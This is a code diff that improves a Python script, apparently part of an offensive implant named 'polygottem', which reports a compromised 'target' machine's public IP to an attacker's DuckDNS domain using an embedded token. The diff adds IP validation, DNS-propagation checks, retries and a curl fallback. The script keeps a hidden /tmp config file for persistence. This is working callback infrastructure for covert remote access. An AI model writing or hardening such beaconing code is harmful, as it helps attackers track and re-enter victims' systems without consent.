@@ -23,7 +23,8 @@ import socket
 import subprocess
 import json
 import random
-from typing import Optional, Dict
+import time
+from typing import Optional, Dict, Tuple
 from datetime import datetime
 
 # Embedded DuckDNS credentials (for target registration)
@@ -33,6 +34,60 @@ DUCKDNS_UPDATE_URL = "https://www.duckdns.org/update"
 
 # Configuration file (saved on target for persistence)
 CONFIG_FILE = "/tmp/.polygottem_target_info.json"
+
+
+def validate_ip_address(ip: str) -> bool:
+    """
+    Validate IP address format
+
+    Args:
+        ip: IP address string to validate
+
+    Returns:
+        True if valid IPv4 or IPv6 address
+    """
+    try:
+        # Try IPv4
+        socket.inet_aton(ip)
+        return True
+    except socket.error:
+        pass
+
+    try:
+        # Try IPv6
+        socket.inet_pton(socket.AF_INET6, ip)
+        return True
+    except socket.error:
+        pass
+
+    return False
+
+
+def verify_dns_resolution(domain: str, expected_ip: str) -> Tuple[bool, Optional[str]]:
+    """
+    Verify DNS resolution matches expected IP
+
+    Args:
+        domain: Domain to check
+        expected_ip: Expected IP address
+
+    Returns:
+        Tuple of (success, resolved_ip)
+    """
+    try:
+        # Wait for DNS propagation
+        time.sleep(2)
+
+        # Resolve domain
+        resolved_ip = socket.gethostbyname(domain)
+
+        # Compare IPs
+        return (resolved_ip == expected_ip, resolved_ip)
+
+    except socket.gaierror:
+        return (False, None)
+    except Exception:
+        return (False, None)
 
 
 def get_public_ip() -> Optional[str]:
@@ -68,38 +123,127 @@ def get_public_ip() -> Optional[str]:
             return None
 
 
-def update_duckdns(ip: str) -> bool:
+def update_duckdns(ip: str, verify: bool = True, max_retries: int = 3) -> bool:
     """
-    Register target's IP with DuckDNS
+    Register target's IP with DuckDNS (with validation and verification)
 
     Args:
         ip: Target's public IP address
+        verify: Verify DNS resolution after update
+        max_retries: Number of retry attempts
 
     Returns:
-        True if registration successful
+        True if registration successful and verified
     """
-    try:
-        import requests
-        params = {
-            'domains': DUCKDNS_DOMAIN.replace('.duckdns.org', ''),
-            'token': DUCKDNS_TOKEN,
-            'ip': ip
-        }
-
-        response = requests.get(DUCKDNS_UPDATE_URL, params=params, timeout=10)
-
-        if response.status_code == 200 and response.text.strip() == 'OK':
-            return True
+    # Validate IP format
+    if not validate_ip_address(ip):
+        print(f"[!] Invalid IP format: {ip}")
         return False
-    except:
-        # Fallback using curl if requests unavailable
+
+    print(f"[*] Validated IP: {ip}")
+
+    # Attempt update with retries
+    for attempt in range(1, max_retries + 1):
         try:
+            # Try with requests library
+            import requests
+
             domain = DUCKDNS_DOMAIN.replace('.duckdns.org', '')
-            url = f"{DUCKDNS_UPDATE_URL}?domains={domain}&token={DUCKDNS_TOKEN}&ip={ip}"
-            result = subprocess.run(['curl', '-s', url], capture_output=True, text=True)
-            return 'OK' in result.stdout
-        except:
+            params = {
+                'domains': domain,
+                'token': DUCKDNS_TOKEN,
+                'ip': ip
+            }
+
+            print(f"[*] Sending update (attempt {attempt}/{max_retries})...")
+            response = requests.get(DUCKDNS_UPDATE_URL, params=params, timeout=10)
+
+            if response.status_code == 200:
+                response_text = response.text.strip()
+
+                if response_text == 'OK':
+                    print(f"[+] DuckDNS API response: OK")
+
+                    # Verify DNS resolution
+                    if verify:
+                        print(f"[*] Verifying DNS resolution...")
+                        success, resolved_ip = verify_dns_resolution(DUCKDNS_DOMAIN, ip)
+
+                        if success:
+                            print(f"[+] DNS verified: {DUCKDNS_DOMAIN} → {resolved_ip}")
+                            return True
+                        else:
+                            if resolved_ip:
+                                print(f"[!] DNS mismatch: Expected {ip}, got {resolved_ip}")
+                            else:
+                                print(f"[!] DNS resolution pending - may take time to propagate")
+
+                            # Still return True if API said OK
+                            return True
+                    else:
+                        return True
+
+                elif response_text == 'KO':
+                    print(f"[!] DuckDNS API returned 'KO' (invalid token/domain)")
+                    if attempt < max_retries:
+                        time.sleep(5)
+                        continue
+                    return False
+                else:
+                    print(f"[!] Unexpected response: {response_text}")
+                    if attempt < max_retries:
+                        time.sleep(2)
+                        continue
+                    return False
+            else:
+                print(f"[!] HTTP {response.status_code}")
+                if attempt < max_retries:
+                    time.sleep(2)
+                    continue
+                return False
+
+        except ImportError:
+            # Fallback using curl if requests unavailable
+            try:
+                domain = DUCKDNS_DOMAIN.replace('.duckdns.org', '')
+                url = f"{DUCKDNS_UPDATE_URL}?domains={domain}&token={DUCKDNS_TOKEN}&ip={ip}"
+
+                print(f"[*] Using curl fallback (attempt {attempt}/{max_retries})...")
+                result = subprocess.run(['curl', '-s', url], capture_output=True, text=True, timeout=10)
+
+                if 'OK' in result.stdout:
+                    print(f"[+] DuckDNS update successful")
+
+                    # Verify DNS if requested
+                    if verify:
+                        success, resolved_ip = verify_dns_resolution(DUCKDNS_DOMAIN, ip)
+                        if success:
+                            print(f"[+] DNS verified: {DUCKDNS_DOMAIN} → {resolved_ip}")
+                        else:
+                            print(f"[!] DNS resolution pending")
+
+                    return True
+                else:
+                    if attempt < max_retries:
+                        time.sleep(2)
+                        continue
+                    return False
+
+            except Exception as e:
+                print(f"[!] Curl failed: {e}")
+                if attempt < max_retries:
+                    time.sleep(3)
+                    continue
+                return False
+
+        except Exception as e:
+            print(f"[!] Error: {e}")
+            if attempt < max_retries:
+                time.sleep(3)
+                continue
             return False
+
+    return False
 
 
 def generate_random_port() -> int:
